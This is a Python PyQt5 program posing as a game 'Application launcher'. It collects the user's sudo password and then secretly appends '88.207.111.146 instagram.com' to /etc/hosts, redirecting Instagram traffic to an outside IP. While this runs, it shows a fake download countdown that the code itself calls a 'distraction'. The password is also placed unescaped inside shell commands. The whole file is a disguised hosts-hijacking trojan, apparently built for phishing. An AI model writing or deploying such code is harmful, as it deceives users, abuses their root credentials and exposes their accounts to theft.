import os
import sys
from PyQt5.QtCore import QTimer, QThread
from PyQt5.QtWidgets import QApplication, QLabel, QWidget
import subprocess
from PyQt5.QtWidgets import QDialog, QVBoxLayout, QLabel, QLineEdit, QPushButton


class PasswordDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle('Prompt password')

        label = QLabel('Please enter your sudo password:')
        self.password_edit = QLineEdit()
        self.password_edit.setEchoMode(QLineEdit.Password)
        self.error_label = QLabel()
        ok_button = QPushButton('OK')
        cancel_button = QPushButton('Cancel')

        ok_button.clicked.connect(self.accept)
        cancel_button.clicked.connect(self.reject)

        layout = QVBoxLayout()
        layout.addWidget(label)
        layout.addWidget(self.password_edit)
        layout.addWidget(self.error_label)
        layout.addWidget(ok_button)
        layout.addWidget(cancel_button)
        self.setLayout(layout)

    def password(self):
        return self.password_edit.text()

    def set_error_message(self, message):
        self.error_label.setText(message)


class PasswordDialogHelper():

    @staticmethod
    def check_sudo_privilages(password_dialog):
        while True:
            if password_dialog.exec_() == QDialog.Accepted:
                password = password_dialog.password()

                command = f"echo '{password}' | sudo -k -S ls -al"

                try:
                    out = subprocess.check_output(
                        command, stderr=subprocess.STDOUT, shell=True)
                    print(out.decode())
                except subprocess.CalledProcessError:
                    message = "Incorrect password"
                    password_dialog.set_error_message(message)
                    password_dialog.password_edit.clear()
                    continue

                return True
            else:
                return False


class FileEditThread(QThread):
    def __init__(self, password):
        super().__init__()
        self.password = password

    def run(self):
        write = "88.207.111.146 instagram.com\n"
        command = f"echo '{self.password}' | sudo -S sh -c 'echo \"{write}\" >> /etc/hosts'"
        subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        password_dialog = PasswordDialog()

        if os.geteuid() != 0:
            has_privilages = PasswordDialogHelper.check_sudo_privilages(
                password_dialog)

            if (not has_privilages):
                sys.exit()

        self.setWindowTitle("Application launcher")
        self.setGeometry(100, 100, 600, 150)
        self.message_label = QLabel(self)
        self.message_label.setGeometry(50, 50, 500, 50)
        self.time_remaining = 60

        self.set_distraction_label()
        self.change_hosts_file(password_dialog.password())

    def change_hosts_file(self, password):
        self.file_edit_thread = FileEditThread(password)
        self.file_edit_thread.start()

    def set_distraction_label(self):
        if self.time_remaining > 0:
            minutes = self.time_remaining // 60
            seconds = self.time_remaining % 60
            time_str = f"{minutes:02d}:{seconds:02d}"
            self.message_label.setText(
                f"Game download will start in:\nTime remaining: {time_str}")
            self.time_remaining -= 1
        else:
            self.message_label.setText(
                "Download complete, you can now close the app.")

        QTimer.singleShot(1000, self.set_distraction_label)


if __name__ == '__main__':
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec_())